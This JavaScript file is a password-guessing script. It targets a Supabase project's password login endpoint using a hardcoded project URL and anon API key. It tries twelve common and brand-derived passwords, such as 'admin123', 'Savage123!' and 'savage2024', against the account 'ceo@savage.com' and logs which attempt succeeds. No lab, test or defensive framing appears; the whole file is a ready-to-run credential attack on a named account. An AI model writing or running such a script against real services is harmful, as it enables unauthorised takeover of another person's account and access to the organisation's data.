const SUPABASE_URL = 'https://cwlaqfjqgrtyhyscwpnq.supabase.co';
const ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImN3bGFxZmpxZ3J0eWh5c2N3cG5xIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjYxMDM3NTcsImV4cCI6MjA4MTY3OTc1N30.qt20ysweHhOMO81o6snFuBf3z5QDL-M1E0jN-ifQC4I';

async function testPassword(pwd) {
  const res = await fetch(`${SUPABASE_URL}/auth/v1/token?grant_type=password`, {
    method: 'POST',
    headers: {
      'apikey': ANON_KEY,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ email: 'ceo@savage.com', password: pwd })
  });
  const data = await res.json();
  if (!res.ok) {
     console.log(pwd, 'Failed');
  } else {
     console.log(pwd, 'SUCCESS');
  }
}

async function run() {
  const pwds = ['123456', 'admin123', 'admin1234', 'admin', 'savage123', 'Savage123!', 'password', 'ceo@savage.com', 'ceo123', 'admin01', 'savage2024', 'Savagebrand'];
  for (const pwd of pwds) {
    await testPassword(pwd);
  }
}

run();
